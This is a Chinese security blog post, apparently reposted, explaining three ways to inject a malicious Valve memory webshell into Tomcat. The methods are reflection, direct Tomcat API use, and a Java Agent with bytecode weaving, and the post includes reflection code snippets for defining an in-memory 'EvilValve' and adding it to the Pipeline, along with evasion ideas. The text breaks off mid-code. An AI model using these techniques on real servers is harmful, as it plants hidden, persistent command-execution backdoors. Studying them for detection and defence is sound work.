@@ -1,0 +1,1219 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/0-11-%E6%AC%A7%E6%B6%A6%E5%90%89.png">
+  <link rel="icon" href="/img/0-11-%E6%AC%A7%E6%B6%A6%E5%90%89.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="linear-gradient(270deg, rgba(107,115,255,0.85), rgba(65,80,220,0.85), rgba(0,180,240,0.85), rgba(60,200,255,0.85), rgba(120,220,255,0.85), rgba(180,120,255,0.85), rgba(220,100,255,0.85), rgba(255,110,230,0.85), rgba(140,100,255,0.85), rgba(100,150,255,0.85), rgba(70,200,220,0.85), rgba(107,115,255,0.85))">
+  <meta name="author" content="Xvsf">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Java内存马——Tomcat Valve型的三种注入">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Java内存马——Tomcat Valve型的三种注入">
+<meta property="og:url" content="http://xvshifu.github.io/2025/11/08/Java%E5%86%85%E5%AD%98%E9%A9%AC%E2%80%94Tomcat%20Valve%E5%9E%8B%E7%9A%84%E4%B8%89%E7%A7%8D%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:site_name" content="Xvsf blogs">
+<meta property="og:description" content="Java内存马——Tomcat Valve型的三种注入">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2025-11-08T07:04:00.000Z">
+<meta property="article:modified_time" content="2025-11-08T07:31:13.794Z">
+<meta property="article:author" content="Xvsf">
+<meta property="article:tag" content="java安全">
+<meta property="article:tag" content="内存马">
+<meta property="article:tag" content="转载">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>Java内存马——Tomcat Valve型的三种注入 - Xvsf blogs</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/xm_custom/custom.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"xvshifu.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":false},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":"0wmNTqqCOUst92FKToSXxgvQ-gzGzoHsz","app_key":"p527aBaA4G01EJdMOVMGXsHR","server_url":"https://0wmntqqc.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":true},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 8.0.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>🖋️ Hello My Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item dropdown">
+              <a class="nav-link dropdown-toggle" target="_self" href="javascript:;" role="button"
+                 data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                <i class="iconfont icon-steam"></i>
+                <span>game</span>
+              </a>
+              <div class="dropdown-menu" aria-labelledby="navbarDropdown">
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/game/mf" target="_self">
+                    
+                    <span>魔方</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/game/sl" target="_self">
+                    
+                    <span>扫雷</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/game/2048" target="_self">
+                    
+                    <span>2048</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/game/wzq" target="_self">
+                    
+                    <span>五子棋</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/game/txz" target="_self">
+                    
+                    <span>推箱子</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/game/dblk" target="_self">
+                    
+                    <span>躲避绿块</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/game/catch-the-cat-master" target="_self">
+                    
+                    <span>围住小猫</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/game/clock/0" target="_self">
+                    
+                    <span>时钟1</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/game/clock/1" target="_self">
+                    
+                    <span>时钟2</span>
+                  </a>
+                
+              </div>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/banner02.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Java内存马——Tomcat Valve型的三种注入"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-11-08 15:04" pubdate>
+          2025年11月8日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          5.5k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          46 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Java内存马——Tomcat Valve型的三种注入</h1>
+            
+              <p id="updated-time" class="note note-info" style="">
+                
+                  
+                    本文最后更新于 2025年11月8日 下午
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="Java内存马——Tomcat-Valve型的三种注入"><a href="#Java内存马——Tomcat-Valve型的三种注入" class="headerlink" title="Java内存马——Tomcat Valve型的三种注入"></a>Java内存马——Tomcat Valve型的三种注入</h1><p><strong>转载自：</strong><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/433972.html"><strong>https://www.freebuf.com/articles/web/433972.html</strong></a></p>
+<h2 id="核心原理"><a href="#核心原理" class="headerlink" title="核心原理"></a>核心原理</h2><ul>
+<li>**Tomcat Pipeline &amp; Valve：**Tomcat 使用责任链模式处理请求。<code>Pipeline</code>包含多个<code>Valve</code>，每个<code>Valve</code>负责特定任务（如认证、日志、访问控制）。<code>StandardWrapperValve</code>(通常位于链尾) 最终调用 Servlet。</li>
+<li>**<code>StandardContext</code>：**代表一个 Web 应用，持有其对应的<code>Pipeline</code>对象 (<code>StandardContext#getPipeline()</code>)。</li>
+<li>**目标：**将恶意<code>Valve</code>注入到目标 Web 应用<code>StandardContext</code>的<code>Pipeline</code>中，通常是插入在<code>StandardContextValve</code>(负责应用级路由) 和<code>StandardWrapperValve</code>(负责调用 Servlet) 之间，或者尽可能靠前（如紧接在<code>AccessLogValve</code>之后）。恶意 Valve 的<code>invoke()</code>方法检查特定请求特征，匹配则执行命令并截断管道（不再调用<code>getNext().invoke()</code>），直接返回响应。</li>
+</ul>
+<h2 id="注入方式详解"><a href="#注入方式详解" class="headerlink" title="注入方式详解"></a>注入方式详解</h2><h3 id="方式一：纯反射注入（无依赖）"><a href="#方式一：纯反射注入（无依赖）" class="headerlink" title="方式一：纯反射注入（无依赖）"></a>方式一：纯反射注入（无依赖）</h3><ul>
+<li><p><strong>场景：<strong>攻击者已通过漏洞（如反序列化、文件上传 Webshell、其他 RCE）获得代码执行能力，但</strong>当前执行环境没有 Tomcat 的<code>catalina.jar</code>等库依赖</strong>（例如在<code>Bootstrap ClassLoader</code>或<code>Common ClassLoader</code>加载的类中执行）。这是最通用的方式。</p>
+</li>
+<li><p><strong>步骤：</strong></p>
+<ol>
+<li><p><strong>获取当前线程的<code>ContextClassLoader</code>(通常是<code>WebappClassLoader</code>):</strong></p>
+<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">ClassLoader webappClassLoader <span class="hljs-operator">=</span> Thread.currentThread().getContextClassLoader()<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>
+</li>
+<li><p><strong>反射获取<code>ApplicationContext</code>(关键):</strong></p>
+<ul>
+<li>Tomcat 将<code>ApplicationContext</code>存储在<code>WebappClassLoader</code>的<code>resources</code>属性 (<code>org.apache.catalina.webresources.StandardRoot</code>) 的<code>context</code>属性中。</li>
+<li>或者通过<code>ClassLoader</code>的<code>resources</code>属性获取<code>WebResourceRoot</code>，再反射获取其<code>context</code>属性。</li>
+</ul>
+<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs abnf">// 通过 WebappClassLoader 获取 resources (StandardRoot)<br>Field resourcesField <span class="hljs-operator">=</span> webappClassLoader.getClass().getDeclaredField(<span class="hljs-string">&quot;resources&quot;</span>)<span class="hljs-comment">;</span><br>resourcesField.setAccessible(true)<span class="hljs-comment">;</span><br>Object standardRoot <span class="hljs-operator">=</span> resourcesField.get(webappClassLoader)<span class="hljs-comment">;</span><br>// 通过 StandardRoot 获取 Context (StandardContext)<br>Field contextField <span class="hljs-operator">=</span> standardRoot.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>)<span class="hljs-comment">;</span><br>contextField.setAccessible(true)<span class="hljs-comment">;</span><br>Object standardContext <span class="hljs-operator">=</span> contextField.get(standardRoot)<span class="hljs-comment">; // 这就是目标 StandardContext</span><br></code></pre></td></tr></table></figure>
+</li>
+<li><p><strong>反射获取<code>Pipeline</code>对象：</strong></p>
+<figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs oxygene"><span class="hljs-keyword">Method</span> <span class="hljs-title function_">getPipelineMethod</span> = <span class="hljs-title function_">standardContext</span>.<span class="hljs-title function_">getClass</span><span class="hljs-params">()</span>.<span class="hljs-title function_">getMethod</span><span class="hljs-params">(&quot;getPipeline&quot;)</span>;<br>Object pipeline = getPipelineMethod.invoke(standardContext)<span class="hljs-punctuation">;</span><br></code></pre></td></tr></table></figure>
+</li>
+<li><p><strong>反射获取<code>addValve</code>方法：</strong></p>
+<figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs oxygene"><span class="hljs-keyword">Method</span> <span class="hljs-title function_">addValveMethod</span> = <span class="hljs-title function_">pipeline</span>.<span class="hljs-title function_">getClass</span><span class="hljs-params">()</span>.<span class="hljs-title function_">getMethod</span><span class="hljs-params">(&quot;addValve&quot;, Valve.class)</span>;<br></code></pre></td></tr></table></figure>
+</li>
+<li><p><strong>构造恶意 Valve 实例：</strong></p>
+<ul>
+<li>将恶意 Valve 的字节码（编译后的<code>.class</code>文件内容）转换为<code>byte[]</code>(可通过 Class 文件硬编码、远程加载、解码等方式)。</li>
+<li>使用当前<code>WebappClassLoader</code>的<code>defineClass</code>方法（需反射调用）在内存中定义恶意 Valve 类。</li>
+</ul>
+<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-comment">// 反射调用 protected final defineClass 方法</span><br>Method defineClassMethod = ClassLoader.<span class="hljs-keyword">class</span>.getDeclaredMethod(<span class="hljs-string">&quot;defineClass&quot;</span>, String.<span class="hljs-keyword">class</span>, <span class="hljs-keyword">byte</span>[].<span class="hljs-keyword">class</span>, <span class="hljs-keyword">int</span>.<span class="hljs-keyword">class</span>, <span class="hljs-keyword">int</span>.<span class="hljs-keyword">class</span>);<br>defineClassMethod.setAccessible(<span class="hljs-keyword">true</span>);<br><span class="hljs-keyword">Class</span> evilValveClass = (<span class="hljs-keyword">Class</span>) defineClassMethod.invoke(webappClassLoader, <span class="hljs-string">&quot;com.evil.EvilValve&quot;</span>, evilValveBytecode, <span class="hljs-number">0</span>, evilValveBytecode.length);<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>实例化恶意 Valve：</li>
+</ul>
+<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">Valve evilValve <span class="hljs-operator">=</span> (Valve) evilValveClass.newInstance()<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>
+</li>
+<li><p><strong>将恶意 Valve 注入 Pipeline：</strong></p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">addValveMethod.<span class="hljs-built_in">invoke</span>(pipeline, evilValve);<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>注入位置控制：Tomcat 的<code>addValve</code>默认加在末尾。要插入特定位置（如开头），需反射获取<code>Pipeline</code>的<code>valves</code>数组 (<code>StandardPipeline#valves</code>)，使用反射修改数组或调用<code>addValve(Valve, int)</code>(如果存在)。</li>
+</ul>
+</li>
+</ol>
+</li>
+<li><p>**优点：**通用性强，不依赖 Tomcat API JAR。</p>
+</li>
+<li><p><strong>缺点：</strong></p>
+<ul>
+<li>代码冗长，大量反射操作。</li>
+<li>需要处理<code>defineClass</code>的调用（<code>protected</code>方法）。</li>
+<li>依赖对 Tomcat 内部结构（<code>WebappClassLoader.resources.context</code>）的准确了解，不同 Tomcat 版本可能有差异。</li>
+<li>注入的 Valve 类由<code>WebappClassLoader</code>加载，在堆内存中可见。</li>
+</ul>
+</li>
+</ul>
+<h3 id="方式二：混合方式（利用-Tomcat-API-反射）"><a href="#方式二：混合方式（利用-Tomcat-API-反射）" class="headerlink" title="方式二：混合方式（利用 Tomcat API &amp; 反射）"></a>方式二：混合方式（利用 Tomcat API &amp; 反射）</h3><ul>
+<li><p><strong>场景：<strong>攻击者获得的代码执行环境</strong>可以访问到 Tomcat 的内部 API</strong>（例如，攻击代码本身是由<code>WebappClassLoader</code>加载的，或者通过某些方式将<code>catalina.jar</code>加入了类路径）。常见于从已存在的 Filter&#x2F;Servlet 型内存马或 JSP Webshell 中进行“二次注入”。</p>
+</li>
+<li><p><strong>步骤：</strong></p>
+<ol>
+<li><p><strong>获取<code>StandardContext</code>(更直接):</strong></p>
+<ul>
+<li>通过<code>ApplicationContext</code>-&gt;<code>ServletContext</code>的属性获取：</li>
+</ul>
+<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs abnf">ServletContext servletContext <span class="hljs-operator">=</span> request.getServletContext()<span class="hljs-comment">; // 如果有 request 对象</span><br>Field applicationContextField <span class="hljs-operator">=</span> servletContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>)<span class="hljs-comment">;</span><br>applicationContextField.setAccessible(true)<span class="hljs-comment">;</span><br>Object applicationContext <span class="hljs-operator">=</span> applicationContextField.get(servletContext)<span class="hljs-comment">;</span><br>Field standardContextField <span class="hljs-operator">=</span> applicationContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>)<span class="hljs-comment">;</span><br>standardContextField.setAccessible(true)<span class="hljs-comment">;</span><br>Object standardContext <span class="hljs-operator">=</span> standardContextField.get(applicationContext)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>或者通过<code>org.apache.catalina.core.ApplicationDispatcher</code>的<code>WRAP_SAME_OBJECT</code>特性（如果启用）获取<code>lastServicedRequest</code>&#x2F;<code>lastServicedResponse</code>中的<code>Context</code>(较复杂)。</li>
+</ul>
+</li>
+<li><p>**获取<code>Pipeline</code>对象：**同方式一。</p>
+</li>
+<li><p><strong>构造恶意 Valve 实例：</strong></p>
+<ul>
+<li>**方式 A (ClassLoader 注入)：**同方式一步骤 5，使用<code>WebappClassLoader.defineClass</code>。</li>
+<li>**方式 B (直接实例化 - 更优)：**如果能直接访问到恶意 Valve 的类定义（例如，恶意 Valve 类字节码已通过其他方式加载，或者攻击代码直接包含了这个类），可以直接<code>new</code>：</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Valve</span> <span class="hljs-variable">evilValve</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">com</span>.evil.EvilValve(); <span class="hljs-comment">// 需要 EvilValve 类在当前 ClassLoader 可见</span><br></code></pre></td></tr></table></figure>
+</li>
+<li><p>**注入 Valve：**直接调用<code>StandardPipeline.addValve()</code>方法：</p>
+<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">((StandardPipeline) pipeline)<span class="hljs-selector-class">.addValve</span>(evilValve);<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>同样可以通过反射操作<code>valves</code>数组控制注入位置。</li>
+</ul>
+</li>
+</ol>
+</li>
+<li><p><strong>优点：</strong></p>
+<ul>
+<li>代码相对简洁清晰（减少了反射）。</li>
+<li>效率更高。</li>
+</ul>
+</li>
+<li><p><strong>缺点：</strong></p>
+<ul>
+<li>依赖 Tomcat API 环境（需要<code>org.apache.catalina.*</code>类可见）。</li>
+<li>如果采用方式 B 构造实例，需要解决如何让<code>EvilValve</code>类被加载的问题（可能仍需<code>defineClass</code>或依赖其他已加载的恶意类）。</li>
+</ul>
+</li>
+</ul>
+<h3 id="方式三：Java-Agent-ASM-Javassist-字节码注入（终极隐蔽）"><a href="#方式三：Java-Agent-ASM-Javassist-字节码注入（终极隐蔽）" class="headerlink" title="方式三：Java Agent + ASM&#x2F;Javassist 字节码注入（终极隐蔽）"></a>方式三：Java Agent + ASM&#x2F;Javassist 字节码注入（终极隐蔽）</h3><ul>
+<li><p><strong>场景：<strong>攻击者具备更高权限（如上传 Agent JAR 或利用 Attach API 注入 Agent），追求极致的隐蔽性。目标是</strong>不创建新的 Valve 类</strong>，而是将恶意逻辑<strong>直接编织</strong>进 Tomcat 核心类（如<code>StandardPipeline</code>或某个关键 Valve）的字节码中。</p>
+</li>
+<li><p><strong>步骤：</strong></p>
+<ol>
+<li><p>**注入 Agent：**通过<code>-javaagent</code>启动参数、<code>VirtualMachine.attach()</code>API 或利用已知漏洞加载恶意 Agent Jar。</p>
+</li>
+<li><p>**实现<code>ClassFileTransformer</code>：**在 Agent 中注册自定义的<code>ClassFileTransformer</code>。</p>
+</li>
+<li><p>**定位并修改目标类：**在<code>transform()</code>方法中，识别目标类（例如<code>org.apache.catalina.core.StandardPipeline</code>）：</p>
+<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;org.apache.catalina.core.StandardPipeline&quot;</span>.<span class="hljs-built_in">equals</span>(className)) &#123;<br>    <span class="hljs-comment">// 使用 ASM 或 Javassist 修改字节码</span><br>&#125;<br></code></pre></td></tr></table></figure>
+</li>
+<li><p><strong>修改<code>addValve</code>或<code>invoke</code>逻辑 (策略)：</strong></p>
+<ul>
+<li>**策略 A (劫持<code>invoke</code>):**修改<code>StandardPipeline</code>的<code>invoke()</code>方法。在方法内部遍历<code>valves</code>数组之前或某个关键节点（如调用<code>StandardContextValve.invoke()</code>前），插入恶意逻辑：检查请求特征，匹配则执行命令、构造响应并返回（跳过后续 Valve）。</li>
+<li>**策略 B (伪装成现有 Valve):**修改某个不常用或非关键的现有 Valve 类（如<code>StandardContextValve</code>或<code>AccessLogValve</code>）的<code>invoke()</code>方法。在其原有逻辑的开头或结尾插入恶意检查逻辑。</li>
+<li>**策略 C (创建“幽灵”Valve):**修改<code>StandardPipeline</code>的<code>addValve()</code>方法。使其在特定条件下（例如，添加的 Valve 类名匹配某个特殊模式或 hash）不真正添加该 Valve，而是将其保存到一个隐藏的列表中。同时修改<code>invoke()</code>方法，使其在调用官方<code>valves</code>数组前后，也遍历并调用这个隐藏列表中的“幽灵” Valve。这种方式极其隐蔽，因为常规的<code>Pipeline.valves</code>数组中看不到恶意 Valve。</li>
+</ul>
+</li>
+<li><p>**字节码操作：**使用 ASM&#x2F;Javassist 库插入恶意字节码。恶意逻辑通常包含：</p>
+<ul>
+<li>从<code>Request</code>对象获取参数&#x2F;头&#x2F;路径。</li>
+<li>与预设密码比较。</li>
+<li>调用<code>Runtime.exec()</code>或<code>ProcessBuilder</code>执行命令。</li>
+<li>读取执行结果，写入<code>Response</code>输出流。</li>
+<li>根据是否匹配密码，决定是否继续调用原始管道逻辑 (<code>getNext().invoke()</code>）。</li>
+</ul>
+</li>
+</ol>
+</li>
+<li><p><strong>优点：</strong></p>
+<ul>
+<li>**终极隐蔽性：**没有新的可疑类 (<code>EvilValve</code>) 被定义和加载。恶意逻辑“溶解”在 Tomcat 官方核心类中。</li>
+<li>不依赖<code>WebappClassLoader</code>，应用重启后只要 Agent 仍在就有效（持久化能力强）。</li>
+<li>极难通过常规内存 dump 分析发现（需要逐类反编译校验）。</li>
+</ul>
+</li>
+<li><p><strong>缺点：</strong></p>
+<ul>
+<li>实现难度极高，需要深入理解 JVM 字节码和 Tomcat 内部流程。</li>
+<li>需要获取 Agent 注入的权限（通常意味着已有较高权限）。</li>
+<li>不同 Tomcat 版本的核心类字节码差异较大，需要为不同版本定制或做兼容。</li>
+<li>Agent 本身的存在可能被检测（JVM 参数、<code>VirtualMachine.list()</code>）。</li>
+</ul>
+</li>
+</ul>
+<h2 id="纯反射注入"><a href="#纯反射注入" class="headerlink" title="纯反射注入"></a>纯反射注入</h2><h3 id="一、核心原理与目标"><a href="#一、核心原理与目标" class="headerlink" title="一、核心原理与目标"></a><strong>一、核心原理与目标</strong></h3><ol>
+<li><strong>目标</strong>：在不引入Tomcat API依赖（<code>catalina.jar</code>等）的情况下，通过纯反射操作：<ul>
+<li>获取当前Web应用的<code>StandardContext</code>（Tomcat核心容器对象）</li>
+<li>定位其<code>Pipeline</code>（请求处理管道）</li>
+<li>动态注入恶意<code>Valve</code>实例到管道中</li>
+</ul>
+</li>
+<li><strong>技术挑战</strong>：<ul>
+<li>绕过类加载器隔离（从非Web类加载器访问Web层对象）</li>
+<li>通过反射链破解Tomcat内部数据结构</li>
+<li>内存中定义恶意Valve类（无磁盘文件）</li>
+</ul>
+</li>
+</ol>
+<h3 id="二、注入流程详解"><a href="#二、注入流程详解" class="headerlink" title="二、注入流程详解"></a>二、注入流程详解</h3><h4 id="步骤1：获取WebappClassLoader"><a href="#步骤1：获取WebappClassLoader" class="headerlink" title="步骤1：获取WebappClassLoader"></a><strong>步骤1：获取WebappClassLoader</strong></h4><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">ClassLoader webappClassLoader <span class="hljs-operator">=</span> Thread.currentThread().getContextClassLoader()<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>原理</strong>：Tomcat为每个Web应用创建独立的<code>WebappClassLoader</code>，当前线程的ClassLoader通常就是它。</li>
+<li><strong>注意</strong>：在非请求线程（如反序列化触发的线程）中需遍历线程组定位。</li>
+</ul>
+<h4 id="步骤2：反射获取StandardContext"><a href="#步骤2：反射获取StandardContext" class="headerlink" title="步骤2：反射获取StandardContext"></a><strong>步骤2：反射获取StandardContext</strong></h4><p>这是最核心的步骤，需穿透两层隐藏引用：</p>
+<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs abnf">// <span class="hljs-number">1</span>. 获取WebappClassLoader的resources属性(StandardRoot)<br>Field resourcesField <span class="hljs-operator">=</span> webappClassLoader.getClass().getDeclaredField(<span class="hljs-string">&quot;resources&quot;</span>)<span class="hljs-comment">;</span><br>resourcesField.setAccessible(true)<span class="hljs-comment">;</span><br>Object standardRoot <span class="hljs-operator">=</span> resourcesField.get(webappClassLoader)<span class="hljs-comment">;</span><br><br>// <span class="hljs-number">2</span>. 获取StandardRoot的context属性(StandardContext)<br>Field contextField <span class="hljs-operator">=</span> standardRoot.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>)<span class="hljs-comment">;</span><br>contextField.setAccessible(true)<span class="hljs-comment">;</span><br>Object standardContext <span class="hljs-operator">=</span> 